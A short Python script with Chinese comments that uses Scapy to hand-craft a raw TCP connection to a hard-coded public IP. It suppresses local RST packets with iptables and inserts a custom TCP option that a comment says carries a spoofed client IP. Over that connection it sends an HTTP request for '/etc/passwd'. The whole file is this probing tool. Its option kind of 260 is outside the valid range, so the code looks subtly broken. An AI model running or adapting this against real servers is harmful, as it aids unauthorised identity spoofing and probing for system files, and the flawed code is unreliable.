from scapy.all import *
import subprocess
import random

host_ip = "10.0.0.3" # localhost ip
target = "23.219.172.51" # target ip
sport = random.randint(48888,49999)
dport = 80


print("Debug command:", f"tcpdump -i any 'tcp port {dport} and host {target} and tcp[tcpflags]  != 0' -nn")
# 添加iptables规则，只阻断发往目标80端口的RST包
add_rule = f"iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {host_ip} --sport {sport} -d {target} --dport {dport} -j DROP"
delete_rule = f"iptables -D OUTPUT -p tcp --tcp-flags RST RST -s {host_ip} --sport {sport} -d {target} --dport {dport} -j DROP"
subprocess.run(add_rule, shell=True)

ip = IP(dst=target)
seq = 1000
# spoof ip 10.153.192.251
sync_tcp_options = [(260, b'\x4b\xc3\xfb\xc0\x99\x0a')] + [('NOP', None)] * 32
ack_tcp_options = [(260, b'\xc3\x4b\x0a\x99\xc0\xfb')] + [('NOP', None)] * 32

# 1. 发送SYN，等待SYN-ACK
syn = TCP(sport=sport, dport=dport, flags='S', seq=seq, options=sync_tcp_options)
syn_ack = sr1(ip/syn, timeout=2)
if syn_ack is None or syn_ack[TCP].flags != 0x12:
    print("没有收到 SYN-ACK，握手失败")
    subprocess.run(delete_rule, shell=True)
    exit()

seq += 1  # SYN占用1个序号
ack = syn_ack.seq + 1

# 2. 发送ACK完成三次握手
ack_pkt = TCP(sport=sport, dport=dport, flags='A', seq=seq, ack=ack, options=ack_tcp_options)
send(ip/ack_pkt)

# 3. 发送HTTP GET请求
payload = "GET /etc/passwd?" + str(ack) + " HTTP/1.0\r\nHost: www.example.com\r\n\r\n"
push_pkt = TCP(sport=sport, dport=dport, flags='PA', seq=seq, ack=ack, options=ack_tcp_options)
send(ip/push_pkt/payload)
seq += len(payload)

# 4. 等待服务器响应，更新ack值
def filter_ack(pkt):
    return pkt.haslayer(TCP) and pkt[IP].src == target and pkt[TCP].dport == sport and pkt[TCP].flags & 0x10 != 0

resp = sniff(filter=f"tcp and src host {target} and tcp dst port {sport}", timeout=8, count=3, lfilter=filter_ack)
if resp:
    # 取最后一个包的seq和载荷长度更新ack
    last_pkt = resp[-1]
    srv_seq = last_pkt[TCP].seq
    srv_len = len(last_pkt[TCP].payload)
    ack = srv_seq + srv_len
else:
    print("没有收到服务器响应")

# 5. 发送确认包
send(ip/TCP(sport=sport, dport=dport, flags='A', seq=seq, ack=ack))

# 6. 删除iptables规则
subprocess.run(delete_rule, shell=True)

# 7. 发送RST包，结束连接
send(ip/TCP(sport=sport, dport=dport, flags='R', seq=seq))

exit(0)
